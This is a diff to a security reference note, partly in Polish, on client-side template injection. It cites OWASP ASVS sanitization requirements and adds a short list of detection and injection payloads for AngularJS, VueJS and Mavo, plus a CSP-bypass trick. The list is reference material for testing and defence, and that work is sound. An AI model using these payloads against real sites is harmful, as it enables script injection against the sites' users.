@@ -120,3 +120,15 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 |---|---|---|
 | V1.3.5 | Sanitization | Verify that the application sanitizes or disables user-supplied scriptable or expression template language content, such as Markdown, CSS or XSL stylesheets, BBCode, or similar. |
 | V1.3.7 | Sanitization | Verify that the application protects against template injection attacks by not allowing templates to be built based on untrusted input. Where there is no alternative, any untrusted input being included dynamically during template creation must be sanitized or strictly validated. |
+
+
+---
+
+## HackTricks Tips
+
+- **Detection**: `{{7*7}}` → jeśli `49` = CSTI confirmed
+- **AngularJS (ng-app)**: `{{constructor.constructor('alert(1)')()}}` lub `<input ng-focus=$event.view.alert('XSS')>`
+- **VueJS v2**: `{{constructor.constructor('alert(1)')()}}`
+- **VueJS v3**: `{{_openBlock.constructor('alert(1)')()}}`
+- **Mavo**: `[self.alert(1)]`
+- **AngularJS + CDN bypass CSP**: load Angular 1.x + prototype.js z `cdnjs.cloudflare.com` → `{{$on.curry.call().alert(1)}}`
